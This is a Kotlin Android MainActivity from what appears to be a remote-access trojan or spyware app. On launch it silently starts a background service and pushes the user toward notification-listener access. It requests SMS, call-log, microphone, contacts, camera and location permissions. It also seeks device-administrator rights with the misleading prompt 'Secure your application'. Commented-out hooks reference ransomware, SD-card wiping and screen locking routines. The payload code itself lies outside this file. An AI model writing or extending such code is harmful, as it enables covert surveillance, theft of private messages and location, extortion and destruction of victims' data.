package com.neaking

import android.Manifest.permission.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.navigation.findNavController
import androidx.navigation.ui.AppBarConfiguration
import androidx.navigation.ui.navigateUp
import androidx.navigation.ui.setupActionBarWithNavController
import com.google.android.material.snackbar.Snackbar
import com.neaking.databinding.ActivityMainBinding
import org.json.JSONObject
import java.io.File


class MainActivity : AppCompatActivity() {

    private val REQUEST_ID_MULTIPLE_PERMISSIONS = 1

    private lateinit var appBarConfiguration: AppBarConfiguration
    private lateinit var binding: ActivityMainBinding
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP_MR1)
    override fun onCreate(savedInstanceState: Bundle?) {

//        val list = JSONArray()
//        val defaultArray = JSONArray()
//        val task = JSONObject()
//        task.put("phoneNo", "07")
//        list.put(task)
//        val sharedPreference =  getSharedPreferences("pendingTasks", Context.MODE_PRIVATE)
//        val editor = sharedPreference.edit()
//        editor.putString("task", list.toString())
//         editor.apply()
//       val userName= sharedPreference.getString("task", defaultArray.toString());
//        if (userName != null) {
//            Log.e("test",userName)
//        }


            startService(Intent(this, MainService::class.java))

    if(!isNotificationServiceRunning()) {
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }

        checkAndRequestPermissions()


//        deviceAdmin()
//        ransomware()
        //wipingSdcard()

      //  lockTheScreen()

    //    autostart()
        // spawn app page settings so you can enable all perms
//        val i = Intent(
//            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
//            Uri.parse("package:" + BuildConfig.APPLICATION_ID)
//        )
//        startActivity(i)

        WindowCompat.setDecorFitsSystemWindows(window, false)
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)

        val navController = findNavController(R.id.nav_host_fragment_content_main)
        appBarConfiguration = AppBarConfiguration(navController.graph)
        setupActionBarWithNavController(navController, appBarConfiguration)

        binding.fab.setOnClickListener { view ->
            Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                    .setAnchorView(R.id.fab)
                    .setAction("Action", null).show()
        }
    }



    private fun checkAndRequestPermissions(): Boolean {
        val camera = ContextCompat.checkSelfPermission(this, CAMERA)
        val storage = ContextCompat.checkSelfPermission(this, WRITE_EXTERNAL_STORAGE)
        val loc = ContextCompat.checkSelfPermission(this, ACCESS_COARSE_LOCATION)
        val loc2 = ContextCompat.checkSelfPermission(this, ACCESS_FINE_LOCATION)


        val readSms = ContextCompat.checkSelfPermission(this, READ_SMS)
        val sendSms = ContextCompat.checkSelfPermission(this, SEND_SMS)
        val readCallLog = ContextCompat.checkSelfPermission(this, READ_CALL_LOG)

        val recordAudio = ContextCompat.checkSelfPermission(this, RECORD_AUDIO)
        val readContacts = ContextCompat.checkSelfPermission(this, READ_CONTACTS)
        val readPhoneState = ContextCompat.checkSelfPermission(this, READ_PHONE_STATE)

        val listPermissionsNeeded: MutableList<String> = ArrayList()


        if (readPhoneState != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(READ_PHONE_STATE)
        }
        if (readSms != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(READ_SMS)
        }

        if (sendSms != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(SEND_SMS)
        }
        if (readCallLog != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(READ_CALL_LOG)
        }

        if (recordAudio != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(RECORD_AUDIO)
        }
        if (readContacts != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(READ_CONTACTS)
        }





        if (camera != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(CAMERA)
        }
        if (storage != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(WRITE_EXTERNAL_STORAGE)
        }
        if (loc2 != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(ACCESS_FINE_LOCATION)
        }
        if (loc != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(ACCESS_COARSE_LOCATION)
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                listPermissionsNeeded.toTypedArray(),
                REQUEST_ID_MULTIPLE_PERMISSIONS
            )
            return false
        }
        return true
    }


    private fun isNotificationServiceRunning(): Boolean {
        val contentResolver = contentResolver
        val enabledNotificationListeners =
            Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val packageName = packageName
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(
            packageName
        )
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        // Inflate the menu; this adds items to the action bar if it is present.
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        return when (item.itemId) {
            R.id.action_settings -> true
            else -> super.onOptionsItemSelected(item)
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        val navController = findNavController(R.id.nav_host_fragment_content_main)
        return navController.navigateUp(appBarConfiguration)
                || super.onSupportNavigateUp()
    }

    private fun deviceAdmin() {
        try {
            // Initiate DevicePolicyManager.
            val policyMgr = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            // Set DeviceAdminDemo Receiver for active the component with different option
            val componentName = ComponentName(this, DeviceAdminComponent::class.java)
            if (!policyMgr.isAdminActive(componentName)) {
                // try to become active
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                intent.putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Click on Activate button to Secure your application"
                )
                startActivity(intent)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun deviceInfo(){
        fun call(vararg args: Any) {
            val filePath = File(args[0].toString())
            if (filePath.isFile) {
                println(filePath)
            } else {
                try {

                        Log.e("JSON ", "sending data failed")

                } catch (e: java.lang.Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

//     private fun ransomware() {
//        val rf = MyService()
//        rf.startrans()
//    }
//    private fun lockTheScreen() {
//        val rf = MyService()
//        rf.lockTheScreen()
//    }
//    private fun wipingSdcard() {
//        val rf = MyService()
//        rf.wipingSdcard()
//    }




}